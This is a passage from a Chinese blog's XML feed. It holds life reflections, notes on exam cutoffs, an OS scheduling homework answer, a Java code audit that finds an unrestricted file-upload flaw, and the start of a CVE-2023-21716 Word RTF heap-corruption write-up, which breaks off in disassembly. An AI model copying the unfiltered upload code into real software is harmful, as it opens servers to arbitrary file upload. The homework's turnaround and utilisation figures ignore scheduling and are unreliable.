        <content type="html"><![CDATA[<p>到一个没有人的地方，与大自然融为一体。一个人，做个安安静静的农民，偶尔做做歌，种种菜，养养鸡，挖挖漏洞，学习新技术，写写代码和文章，今天学习怎么制作篱笆，怎么设计花园，明天看看书，爬爬山，周末远门徒步，该工作时工作，该休息时休息，这便是我向往的田园生活，也是心目中的向往。</p><iframe src="//player.bilibili.com/player.html?aid=625555566&bvid=BV1Kt4y117GR&cid=185990387&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500"> </iframe>]]></content>
      
      
      <categories>
          
          <category> Reflections on life | 人生上的思考 | 生活杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈2023年研考国家线最新公布</title>
      <link href="/2023/03/14/%E6%B5%85%E8%B0%882023%E5%B9%B4%E7%A0%94%E8%80%83%E5%9B%BD%E5%AE%B6%E7%BA%BF%E6%9C%80%E6%96%B0%E5%85%AC%E5%B8%83/"/>
      <url>/2023/03/14/%E6%B5%85%E8%B0%882023%E5%B9%B4%E7%A0%94%E8%80%83%E5%9B%BD%E5%AE%B6%E7%BA%BF%E6%9C%80%E6%96%B0%E5%85%AC%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<p>国家线的作用：<br>国家线是国家确定初试成绩基本要求，包括应试科目总分要求和单科分数要求。是院校筛选学生的重要依据。<br>所以在国家线公布之后，大家可以需要做些什么呢？<br><img src="https://s2.loli.net/2023/03/12/GQSNY9bVPnWlAJU.png" alt="23年考研国家线" style="zoom: 25%; float: left;" /></p><p>来具体看看各专业国家线的变化情况<br>下降的专业</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">经济学降14分；金融专硕降14分；管理学降13分；</span><br><span class="line">医学降了13分；理学降11分；中医照顾类降11分；</span><br><span class="line">法学降9分；军事学降5分；文学降4分；</span><br><span class="line">教育学降1分；农学降1分</span><br></pre></td></tr></table></figure><p>上涨的专业</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">哲学涨了9分；体育/体育学涨了9分；</span><br><span class="line">会计专硕涨4分；图书情报涨4分</span><br></pre></td></tr></table></figure><p>所以在国家线公布之后，大家可以需要做些什么呢？</p><h2 id="实时关注学校公告"><a href="#实时关注学校公告" class="headerlink" title="实时关注学校公告"></a>实时关注学校公告</h2><p>国家线公布以后，各大高校会相继发布“复试线”，即高于这个分数线的考生可以参加该院校的复试。有些学校也会直接拿国家线当复试线。<br>所以，在考研国家线公布以后，考生应该时刻关注自己所报考院校的“考研公告”，第一时间掌握准确的考研情报。</p><h2 id="踏实准备复试"><a href="#踏实准备复试" class="headerlink" title="踏实准备复试"></a>踏实准备复试</h2><p>国家线公布以后，院校会公布复试公告，考生需要仔细阅读复试公告，清楚复试科目及复试形式较之去年有没有发生变化。<br>有以下三种情况：<br>01 分数高于A区国家线<br>需要根据自己的院校排名或者是历年的复试线判断自己是否能进入一志愿复试（高于A区线不代表可以进入复试哦）。</p><ul><li>假若顺利进入一志愿复试<br>因为目前大部分院校的复试形式暂不确定，同学们可以把线上及线下的复试情形都演习一下。<br>复试面试流程一般为：面试组织→抽签入场→面试答题→随机提问→考生退场→评分考核</li><li>假若未能进入一志愿复试<br>在这里也不要遗憾，此刻你需要选择有“把握”的调剂院校~</li></ul><p>02 分数低于考研A区国家线<br>分数低于A区但高于B区国家线的同学，在满足要求的情况下，可以调剂到考研B区的国家线。<br>调剂建议：<br>a. 优先考虑校内调剂（需过目标院校复试线）<br>b. 选择自己的本科就读的院校（需满足院校调剂条件）<br>c. 关注那些今年有新设专业的院校<br>d. 多看看中西部地区的院校</p><p>03 分数低于考研B区国家线<br>如果你的分数线低于B区国家线，那可能就需要加把劲了。</p>]]></content>
      
      
      <categories>
          
          <category> 研考信息 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>标题有那么重要吗</title>
      <link href="/2023/03/14/%E6%97%A0%E9%A2%98/"/>
      <url>/2023/03/14/%E6%97%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="思绪多的原因"><a href="#思绪多的原因" class="headerlink" title="思绪多的原因"></a>思绪多的原因</h2><p>人的思绪之所以会那么多，是因为我们的大脑是一个复杂的信息处理系统。大脑会不断接收来自身体、环境和思维的各种信号，并在神经元之间进行快速的信息传递和处理。这些信号可以是来自五官的感觉输入、内部的生理信号、以及我们的想象、回忆、情绪、计划等等。</p><p>此外，我们的日常生活中充满了各种刺激和信息，比如工作、学习、社交、娱乐等等，这些都会引起我们的思维活动。另外，我们的大脑还会在休息时自主地进行思考和反思，这也会导致我们有很多的思绪。</p><p>因此，人每天的思绪之所以那么多，是因为我们的大脑在不断接收和处理各种信息，同时也受到外部环境和内部情绪的影响。那么以下是我大脑思考的一些问题杂记（可以理解成思绪垃圾桶，无结论）。</p><h2 id="思绪一"><a href="#思绪一" class="headerlink" title="思绪一"></a>思绪一</h2><p>生活和生存在人生中往往是包含关系，生活一定是生存，但生存不一定是生活，生活的本质是生存，生存的意义是为了更好的生活、让自己的人生拥有意义或者无意义的活着。（也许明年这个理论又会变呢？），所以要相信科学，科学是通过观察、实验和推理，以系统化的方式研究自然现象和宇宙的方法。科学的目的是寻求真理，建立对自然现象的精确和可靠的理解，并为我们的生活和社会提供知识和技术的基础，事有绝对也是有生命周期的，今天的数学公式可能二十年后会被推翻，顺其自然，佛系点，乐观点，并且保持一定积极向上的态度努力做好自己和当下就好。</p><h2 id="思绪二"><a href="#思绪二" class="headerlink" title="思绪二"></a>思绪二</h2><p>有时候会怀疑自己是不是不应该真诚待人，很奇怪吧，因为你的真诚会让人觉得你很幼稚，但是真正幼稚的是那些虚伪和玩弄人情感的人，骗人的本质还是在骗自己，骗的了别人但无法骗自己，幼稚是什么？成熟是什么？</p><h2 id="思绪三"><a href="#思绪三" class="headerlink" title="思绪三"></a>思绪三</h2><p>小时候看动画片的时候，自己会去区分动画片里面人物哪个是好人哪个是坏人，到后面随着年龄的增长，发现好人和坏人越来越难定义。因为在漫漫的人生中你会发现这个世界不是非黑即白的，不单单只有好人和坏人，大部分人都是好坏参半，坏人也不一定全坏，坏人也不一定想成为坏人。</p><h2 id="思绪四"><a href="#思绪四" class="headerlink" title="思绪四"></a>思绪四</h2><p>尝试一个人去做的20件事：<br>1.收拾房间<br>2.给自己买一束花<br>3.选一天，离开网络<br>4.做一次手工<br>5.给2024的自己写一封信<br>6.去自习室一整天<br>7.用不常用的交通工具出行<br>8.点一杯从没喝过的饮料<br>9.十点钟上床睡觉<br>10.早起吃丰盛的晚餐<br>11.去另一个城市<br>12.跟一年以上没见过的朋友聊天<br>13.过生日<br>14.给爸爸妈妈做一个礼物<br>15.和陌生人说三句话<br>16.慢跑半小时<br>17.2天短期旅行<br>18.一口气读完一本书<br>19.一个人看展看电影<br>20.翻看家里的老照片旧物件</p><h2 id="思绪五"><a href="#思绪五" class="headerlink" title="思绪五"></a>思绪五</h2><p>书签2🔖<br>2022.08.01<br>        见过十几岁的人拿世界冠军，也见过年龄五十多的大叔还在挑战极限运动，年龄只是个数字，年龄不足以成为阻止你进步和追逐梦想的绊脚石，不知道自己老了以后还会不会依然热情十足、精力旺盛，但是我可以肯定的是现在的我可以为了自己感兴趣的事情熬一个通宵，可以为了感兴趣的事情去不断学习，不断挖掘新东西才会有新的挑战，这样热爱的事情才不会失去热情。</p><p>2022.11.01<br>        面对爱情这一种情感，我可能会孤独终老吧，因为我一点也不期待爱情会是什么样子， 有时候总感觉自己身边的同龄人都在忙着谈恋爱，不是在谈恋爱就是在准备在谈恋爱的路上，我觉得这也没什么问题，让我不理解的是人都只活一辈子，为什么绝大部分人都是这样，好像每个人都得过这样的人生，不想过每个人都一个模样的人生，自己也只是个普普通通的人，但是我会去做一些超乎普通人想象的事情，这个世界好像挺多人都被一种无形的规则给禁锢住，好像人到了一定的年龄就得必须要结婚生娃繁衍后代，过上财米油盐的生活，看到自己身边的同龄人一个个二十出头就打算踏入婚姻，我有点不理解，为什么现在年轻人老是想着这些情情爱爱，风华正茂，朝气蓬勃的年纪不应该是去为自己的未来打拼和追逐自己的梦想吗？不应该多去了解自己，寻找自己的EGO吗？就好像没把基础打磨好楼房，在日后经历风吹雨打之后可想而知倒塌的概率有多大，人都只活一辈子，为什么人人都要一个模样，自己一直在跟这种无形的规则做对抗，我也不知道自己哪一天可能就会妥协，还能对抗下去多久。有时候我也会质疑自己，难道有个女儿天天陪着你，有个你爱的人和爱你的人互相陪伴着彼此不好吗？生活中多一份使命感不也挺好，父母多么希望以后能看到自己成家立业有自己的儿女，和自己喜欢的人在一起共同奋斗享受生活难道不好吗？人到生老病死有个人陪伴不好吗？履行中华民族血脉可持续发展的任务不正确吗？我想自己是时候思考这个矛盾的正负平衡。</p><h2 id="思绪六"><a href="#思绪六" class="headerlink" title="思绪六"></a>思绪六</h2><p>时常从音乐里面感受到别人的ego，触碰到别人的ego，看到别人ego的形状，感受到别人是一个什么样的灵魂，仿佛像是自己的ego和别人的ego拥抱了在一起，感同身受，难以用言语去形容，这可能就是找到自己ego的人之间的交流。</p><!-- 在这里插入您的网页其他内容 --><!-- 在这里插入网易云音乐的嵌入代码 --><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1403429047&auto=1&height=66"></iframe><!-- 将上面的“歌曲ID”替换为您想要嵌入的歌曲的ID即可。 --><!-- 在这里插入您的网页其他内容 --></iframe><h2 id="思绪七"><a href="#思绪七" class="headerlink" title="思绪七"></a>思绪七</h2><p>想那么多还不如多去实现自己的一个个梦想，享受整个把梦想变成现实的过程，这个世界就是很多矛盾的存在，享受当下和为未来努力，有能力的话可以去不断探索，去成为未来的开拓者。因为人只能在有限的时间里思考和做改变，时间是定量而不是变量，所以不要为了谁为了不快乐和阻碍你成长的事情让自己失去了思考，所有的一切都是为了让自己变的更好然后尽可能的实现和改变一些事情。所有的变强都是在为未来的做贡献。生活中的爱情也只是虚无的存在，不过就是一种情感，但结婚的本质就是为了繁殖和维持爱情这一种情感，多一份陪伴在这个为了未来奋斗的路上，也为了彼此，所以真正有用的爱情一定是互相促进成长的，但好的情感之间不谈利益，这又是概念定义的一个矛盾的点，但从为了未来发展的角度来看，有用的爱情才是本质，而不是好的情感。（今天上厕所时的想法，不代表任何东西，发出来只是把这里当成日记簿，下次看到好方便自己继续寻找答案，一个书签🔖的存在）</p><h2 id="思绪八"><a href="#思绪八" class="headerlink" title="思绪八"></a>思绪八</h2><p>发现人在愚蠢的时候是不知道自己愚蠢的，所以这个时候你可以去选择倾听多一些客观的意见，通过客观的意见结合自己主观的想法去做调整。</p>]]></content>
      
      
      <categories>
          
          <category> Reflections on life | 人生上的思考 | 生活杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传白盒审计（源码审计）</title>
      <link href="/2023/03/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%88%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89/"/>
      <url>/2023/03/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%88%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="查看pom-xml文件"><a href="#查看pom-xml文件" class="headerlink" title="查看pom.xml文件"></a>查看pom.xml文件</h2><p>寻找是否使用了文件上传的组件，如common-fileupload<br>小技巧：快捷键Ctrl+Shift+F可以在IDEA中全局搜索common-file，如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.3</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/07/ulNyS7L6cjIvg2X.png" alt="image-20220819112658814.png"><br>注意：在纯代码审计中我们只需要关注后端的源码，也就是Controller层代码<br><img src="https://s2.loli.net/2023/03/07/bOwLyfFW5tNlgrE.png" alt="image-20220819142948521.png"></p><h2 id="审计过滤信息"><a href="#审计过滤信息" class="headerlink" title="审计过滤信息"></a>审计过滤信息</h2><p>找到后端上传文件代码部分后并开始判断对上传上来的文件是否做过滤<br><img src="https://s2.loli.net/2023/03/07/pm7axWJzwclBRFV.png" alt="image-20220819143623606.png"><br>对uploadfile方法进行审计，中间使用了fs.savefile()方法对文件进行了保存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;fileupload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">uploadfile</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, <span class="meta">@RequestParam(&quot;pathid&quot;)</span> Long pathid,</span></span><br><span class="line"><span class="params">HttpSession session, Model model)</span> <span class="keyword">throws</span> IllegalStateException, IOException &#123;</span><br><span class="line"><span class="type">Long</span> <span class="variable">userid</span> <span class="operator">=</span> Long.parseLong(session.getAttribute(<span class="string">&quot;userId&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> udao.findOne(userid);</span><br><span class="line"><span class="type">FilePath</span> <span class="variable">nowpath</span> <span class="operator">=</span> fpdao.findOne(pathid);</span><br><span class="line"><span class="comment">// true 表示从文件使用上传</span></span><br><span class="line"><span class="type">FileList</span> <span class="variable">uploadfile</span> <span class="operator">=</span> (FileList) fs.savefile(file, user, nowpath, isfile:<span class="literal">true</span>);</span><br><span class="line">System.out.println(uploadfile);</span><br><span class="line"></span><br><span class="line">model.addAttribute(<span class="string">&quot;pathid&quot;</span>, pathid);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;forward:/filetest&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fs.savefile()方法代码剖析</span></span><br><span class="line">RequestMapping方法请求一个上传文件的的控制器</span><br><span class="line">可以看出来此处MultipartFile file上传了一个file</span><br><span class="line">将上传上来的file文件通过savefile()方法进行文件保存,其中savefile函数通过把上传的file文件、userid、nowpath路径进行保存,isfile:<span class="literal">true</span>是默认值,不用管</span><br></pre></td></tr></table></figure><p>说到这里，那么我们现在继续跟进savefile()方法，看看savefile方法有没有对保存的文件内容是否有做过滤<br><img src="https://s2.loli.net/2023/03/07/PNymTZ1uhCtngIq.png" alt="image-20220819154851329.png"><br><img src="https://s2.loli.net/2023/03/07/hvOUyr4XIuBREpj.png" alt="image-20220819154924127.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">savefile</span><span class="params">(MultipartFile file, User user, FilePath nowpath, <span class="type">boolean</span> isfile)</span> <span class="keyword">throws</span> IllegalStateException, IOException &#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy/MM&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;/&quot;</span> + user.getUserName();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">savepath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.rootPath, tmp);</span><br><span class="line">        <span class="comment">//System.out.println(savePath.getPath());</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!savepath.exists()) &#123;</span><br><span class="line">            savepath.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line"> <span class="comment">//MultipartFile file, User user, FilePath nowpath, boolean isfile</span></span><br><span class="line"> 将上传上来的file文件通过savefile()方法进行文件保存,其中savefile函数通过把上传的file文件、userid、nowpath路径进行保存,isfile:<span class="literal">true</span>是默认值,不用管 </span><br><span class="line">   </span><br><span class="line"> <span class="comment">//SimpleDateFormat simpleDateFormat = new SimpleDateFormat(&quot;yyyy/MM&quot;);    </span></span><br><span class="line"> SimpleDateFormat是定义时间格式的一个对象，此处定义上传时间yyyy/MM的格式</span><br><span class="line">   </span><br><span class="line"><span class="comment">//String tmp = simpleDateFormat.format(new Date()) + &quot;/&quot; + user.getUserName();   </span></span><br><span class="line">意思是String类型的tmp是以传入的一个新的时间 + / +一个新的用户名字组成的，也就是说String类型的tmp说白了就是做为文件的名字来使用的</span><br><span class="line">   </span><br><span class="line"><span class="comment">//File savepath = new File(this.rootPath, tmp);</span></span><br><span class="line"><span class="built_in">this</span>.rootPath是当前路径的意思，此处整体意思是保存当前的路径，把前面的tmp的文件名传进来</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if (!savepath.exists()) &#123;</span></span><br><span class="line"><span class="comment">//            savepath.mkdirs();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">判断是否存在这个路径，如果不存在就创建一个 </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shuffix</span> <span class="operator">=</span> FilenameUtils.getExtension(file.getOriginalFilename());</span><br><span class="line">log.info(<span class="string">&quot;shuffix:&#123;&#125;&quot;</span>, shuffix);</span><br><span class="line"><span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> UUID.randomUUID().toString().toLowerCase() + <span class="string">&quot;.&quot;</span> + shuffix;</span><br><span class="line">tmp = <span class="string">&quot;/&quot;</span>+tmp + <span class="string">&quot;/&quot;</span> + newFileName;</span><br><span class="line"><span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savepath, newFileName);</span><br><span class="line">file.transferTo(targetFile);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shuffix</span> <span class="operator">=</span> FilenameUtils.getExtension(file.getOriginalFilename());  </span><br></pre></td></tr></table></figure><p>百度看到getOriginalFilename()这个函数是获取文件名的方法，FilenameUtils.getExtension()是获取文件后缀<br><img src="https://s2.loli.net/2023/03/07/8IAjkf7eSEhprlg.png" alt="image-20220819162525415.png"><br><img src="https://s2.loli.net/2023/03/07/yBO7s5GFYaSovXz.png" alt="image-20220819163143675.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shuffix</span> <span class="operator">=</span> FilenameUtils.getExtension(file.getOriginalFilename());  </span><br><span class="line"><span class="comment">//整体解读就是获取文件的文件名和后缀</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> UUID.randomUUID().toString().toLowerCase() + <span class="string">&quot;.&quot;</span> + shuffix;  </span><br><span class="line"><span class="comment">//可以看到通过uuid生成一段随机数 + 文件名+后缀，最后String newFileName整体作为一个新的文件的名字</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/07/T5MWIGkOYuBpt6n.png" alt="image-20220819163447398.png"><br>所以说分析到这里，它的文件后缀在过程中没有进行过滤处理 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tmp = <span class="string">&quot;/&quot;</span>+tmp + <span class="string">&quot;/&quot;</span> + newFileName;</span><br><span class="line"><span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savepath, newFileName);</span><br><span class="line">file.transferTo(targetFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//也就是说  / + tmp路径 + / 文件名+后缀就是上传的文件路径 </span></span><br><span class="line"><span class="comment">//最后     savepath前面保存的路径,文件名+后缀就是上传的目标文件</span></span><br><span class="line"><span class="comment">// 最后    使用file.transferTo()把targetFile传递回来</span></span><br></pre></td></tr></table></figure><p>跳到transferTo()方法查看，发现这个方法就是保存文件到磁盘中的一个方法，目前不用太深入，知道用法就好<br><img src="https://s2.loli.net/2023/03/07/pUJai2dI3yl1Tms.png" alt="image-20220819164735130.png"></p><p><img src="https://s2.loli.net/2023/03/07/dePB1zqDk8YZMbh.png" alt="image-20220819165033135.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以整体只是获取文件名+后缀并使用，中间没有做白名单判断也没有做黑名单判断、没有对文件内容、文件类型判断，审计到这里基本可以判断这个地方存在任意文件上传。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 - 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课后题目分析</title>
      <link href="/2023/03/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/03/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>如果CPU、I1、I2都能并行工作，优先级从高到低依次为job1、job2和job3，优先级高的作业可以抢占优先级低的作业的CPU。<br>每个作业的处理顺序和使用设备的时间如下：<br>job1：I2(20ms)，CPU(10ms)，I1(30ms)，CPU(10ms)<br>job2：I1(20ms)，CPU(20ms)，I2(40ms)<br>job3：CPU(30ms)，I1(20ms)<br>试求:<br>（1）每个作业从投入到完成分别需要的时间;<br>（2）每个作业从投入到完成的CPU利用率;<br>（3）I&#x2F;O设备利用率;</p><h2 id="2、解答"><a href="#2、解答" class="headerlink" title="2、解答"></a>2、解答</h2><p>(1) 每个作业从投入到完成分别需要的时间；<br>  job1: I2(20ms) + CPU(10ms) + I1(30ms) + CPU(10ms) &#x3D; 70ms<br>  job2:  (I1(20ms) + CPU(20ms) + I2(40ms) &#x3D; 80ms<br>  job3:  (CPU(30ms) + I1(20ms) &#x3D; 50ms<br>  所以3个作业从投入到完成分别需要的时间job1 &#x3D; 70ms、job2 &#x3D; 80ms、job3 &#x3D; 50ms。</p><p>(2) 每个作业从投入到完成的CPU利用率；<br>前置知识：<br>CPU利用率指的是CPU在一段时间内实际工作时间与总时间的比值，通常用百分比表示。<br>CPU利用率的计算公式如下：<br>CPU利用率 &#x3D; CPU实际工作时间 &#x2F; 总时间<br>其中，CPU实际工作时间指的是CPU在一段时间内真正工作的时间，不包括等待、挂起、休眠等非工作状态的时间;总时间指的是CPU在一段时间内的总时间，包括CPU实际工作时间和非工作状态的时间。<br>job1：(10ms + 10ms) &#x2F; 70ms &#x3D; 28.57%<br>job2：20ms &#x2F; 80ms &#x3D; 25%<br>job3：30ms &#x2F; 50ms &#x3D; 60%<br>因此，job1 的 CPU 利用率为 28.57%，job2 的 CPU 利用率为 25%，job3 的 CPU 利用率为 60%。</p><p>(3) I&#x2F;O 设备利用率；<br>前置知识：<br>I&#x2F;O设备利用率是指I&#x2F;O设备在总运行时间中实际被占用的时间占比。计算公式如下：<br>I&#x2F;O设备利用率 &#x3D; I&#x2F;O设备运行时间 &#x2F; 总运行时间<br>其中I&#x2F;O设备运行时间是指I&#x2F;O设备在执行作业时实际被占用的时间，总运行时间是指所有作业的运行时间总和。<br>  I1：20ms + 30ms + 20ms &#x3D; 70ms<br>  I2：20ms + 40ms &#x3D; 60ms<br>  因此，I1 的利用率为 70ms &#x2F; 200ms &#x3D; 35%，I2 的利用率为 60ms &#x2F; 200ms &#x3D; 30%。<br>（其中I&#x2F;O的总执行时间 &#x3D; job1+job2+job3的执行时间总和 &#x3D; 200ms）<br>下面是 CPU、I1、I2 的执行时间和空闲时间的图示：<br><img src="https://s2.loli.net/2023/03/06/49iUH8WM5wEvAkl.png" alt="image-20230303170432961.png" style="float: left; zoom: 50%;"></p><p>详细图如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">时间轴：<span class="number">0</span>        <span class="number">20</span>        <span class="number">30</span>        <span class="number">60</span>        <span class="number">80</span>        <span class="number">100</span>       <span class="number">110</span></span><br><span class="line">job1：  I2<span class="number">-20</span><span class="comment">----CPU-10---I1-30----CPU-10--------------F-------------------</span></span><br><span class="line">job2：  <span class="comment">----I1-20---CPU-20-------------I2-40--------------------F---------</span></span><br><span class="line">job3：  CPU<span class="number">-30</span><span class="comment">------------I1-20-------------------------------------F-------</span></span><br><span class="line">CPU：   <span class="comment">--10-----------------------20-----------------30-----------------20--</span></span><br><span class="line">I1：    <span class="comment">---------20--------------30--------------20-------------------------</span></span><br><span class="line">I2：    <span class="comment">--------------20----------------------40----------------------------</span></span><br></pre></td></tr></table></figure><p>其中，CPU 的执行时间为 70ms（10ms + 10ms + 20ms + 30ms），空闲时间为 40ms；I1 的执行时间为 70ms（20ms + 30ms + 20ms），空闲时间为 130ms；I2 的执行时间为 60ms（20ms + 40ms），空闲时间为 140ms。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption</title>
      <link href="/2023/03/14/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/"/>
      <url>/2023/03/14/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/</url>
      
        <content type="html"><![CDATA[<p>CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption<br>A vulnerability within Microsoft Office’s wwlib allows attackers to achieve<br>remote code execution with the privileges of the victim that opens a malicious<br>RTF document. The attacker could deliver this file as an email attachment (or<br>other means).</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Microsoft Word is the word processing application included with Microsoft<br>Office. Per a default installation, Microsoft Word handles Rich-Text Format<br>(RTF) documents. Such documents are comprised of primarily 7-bit ASCII based<br>keywords that together can encapsulate a wide variety of rich content.</p><h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>The RTF parser in Microsoft Word contains a heap corruption vulnerability when<br>dealing with a font table (<em>\fonttbl</em>) containing an excessive number of fonts<br>(<em>\f###</em>). When processing fonts, the font id value (the numbers after a <em>\f</em>)<br>are handled by the following code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0d6cf0b6 0fbf0e          movsx   ecx,word ptr [esi]         ; load base idx</span><br><span class="line">0d6cf0b9 0fbf5602        movsx   edx,word ptr [esi+2]       ; load font idx</span><br><span class="line">0d6cf0bd 8d1451          lea     edx,[ecx+edx*2]            ; multiply by ~3</span><br><span class="line">0d6cf0c0 